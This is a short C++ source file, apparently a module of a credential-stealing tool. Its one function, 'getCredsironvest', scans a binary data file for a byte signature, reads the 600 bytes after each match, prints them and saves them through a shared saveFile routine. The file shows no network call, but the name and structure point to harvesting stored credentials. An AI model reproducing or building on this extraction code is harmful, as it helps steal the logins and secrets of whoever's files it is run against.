#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include "../core/saveFile.h"

int getCredsironvest(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    // Specify your search pattern here
    std::vector<unsigned char> searchPattern = { 0x00, 0x03, 0x00, 0x00, 0x00, 0x10, 0x00};

    int consecutiveSpaces = 0;  // To track how many bytes matched so far

    while (!file.eof()) {
        unsigned char c;
        file.read(reinterpret_cast<char*>(&c), sizeof(c));

        // Check if the character matches the search pattern
        if (c == searchPattern[consecutiveSpaces]) {
            consecutiveSpaces++;

            if (consecutiveSpaces == searchPattern.size()) {
                // Pattern found, now read the next 600 characters after the pattern
                std::vector<unsigned char> buffer(600, 0);  // Adjust size for 600 characters
                file.read(reinterpret_cast<char*>(buffer.data()), buffer.size());

                // Convert the buffer to a UTF-8 string
                std::string utf8Data(buffer.begin(), buffer.end());

                // Print the UTF-8 string
                std::cout << "Data after pattern: " + utf8Data << std::endl;

                // Save into file
                saveFile(utf8Data);

                consecutiveSpaces = 0;
            }
        }
        else {
            consecutiveSpaces = 0;  // Reset if the current character doesn't match the pattern
        }
    }

    file.close();
    return 0;
}
